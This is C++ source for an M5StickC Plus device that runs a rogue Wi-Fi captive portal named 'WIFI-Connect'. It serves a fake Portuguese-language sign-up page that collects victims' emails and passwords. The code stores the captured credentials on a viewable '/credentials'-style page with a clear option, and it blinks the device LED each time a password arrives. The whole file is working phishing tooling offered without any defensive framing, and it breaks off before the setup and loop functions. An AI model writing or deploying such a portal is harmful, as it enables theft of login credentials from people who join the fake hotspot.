#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// User configuration
#define SSID_NAME "WIFI-Connect"
#define SUBTITLE "Internet para todos!"
#define TITLE "Login"
#define BODY "Crie uma conta para se conectar a internet."
#define POST_TITLE "Validando..."
#define POST_BODY "Sua conta está sendo validada. Aguarde até 2 minutos pela conexão do dispositivo.</br>Obrigado."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

int capcount = 0;
int previous = -1; // stupid hack but wtfe
int BUILTIN_LED = 10;

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName)
{
    String a = webServer.arg(argName);
    a.replace("<", "&lt;");
    a.replace(">", "&gt;");
    a.substring(0, 200);
    return a;
}

String footer()
{
    return "</div><div class=q><a><h5>Todos os direitos reservados.</h5></a></div>";
}

String header(String t)
{
    String a = String(SSID_NAME);
    String CSS = "body { background: #f2f2f2; color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                 ".container { background: #fff; margin: 50px auto; max-width: 400px; height: 470px; padding: 20px; border-radius: 15px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); position: relative; }"
                 ".blue-strip { background: #0066ff; height: 10px; border-top-left-radius: 10px; border-top-right-radius: 10px; position: absolute; top: 0; left: 0; right: 0; }"
                 "h1 { margin: 3.5em 0 0 0; }"
                 "h3 { margin: 1.5em 0 0 0; }"
                 "h5 { margin: 1.5em 0 0 0; font-weight: normal; }"
                 "input, textarea, input[type=\"password\"] { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 15px; border: 1px solid #c2c2c2; }"
                 "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
                 "nav { background: #491165; color: #fff; display: block; font-size: 1.3em; padding: 1em; border-top-left-radius: 10px; border-top-right-radius: 10px; }"
                 "nav b { display: block; font-size: 1.5em; margin-bottom: .5em; } "
                 "textarea { width: 100%; }"
                 "input[type=\"submit\"] { background-color: #8b4caf; color: white; padding: 10px 15px; font-size: 16px; border: none; border-radius: 10px; cursor: pointer; }"
                 "input[type=\"submit\"]:hover { background-color: #8b4caf98; }"
                 "p { font-size: 10px; color: #666; margin-top: 20px; text-align: center; }";

    String h = "<!DOCTYPE html><html>"
               "<head><title>" + a + " :: " + t + "</title>"
                                                    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                                    "<style>" + CSS + "</style></head>"
                                                                     "<body><div class=\"container\"><div class=\"blue-strip\"><nav><b>" + a + "</b> " + SUBTITLE + "</nav></div><h1>" + t + "</h1><div>";
    return h;
}

String creds()
{
    return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index()
{
    return header(TITLE) + "<div><h5>" + BODY + "</h5></ol></div><div><form action=/post method=post>" +
                           "<h3>Email:</h3> <center><input type=text autocomplete=email name=email></input></center>" +
                           "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center></div>" + footer();
}

String posted()
{
    String email = input("email");
    String password = input("password");
    Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
    return header(POST_TITLE) + "<h5>" + POST_BODY + "</h5>" + footer();
}

String clear()
{
    String email = "<p></p>";
    String password = "<p></p>";
    Credentials = "<p></p>";
    return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{
    // The internal LED will blink 5 times when a password is received.
    int count = 0;
    while (count < 5)
    {
        digitalWrite(BUILTIN_LED, LOW);
        delay(500);
        digitalWrite(BUILTIN_LED, HIGH);
        delay(500);
        count = count + 1;
    }
}
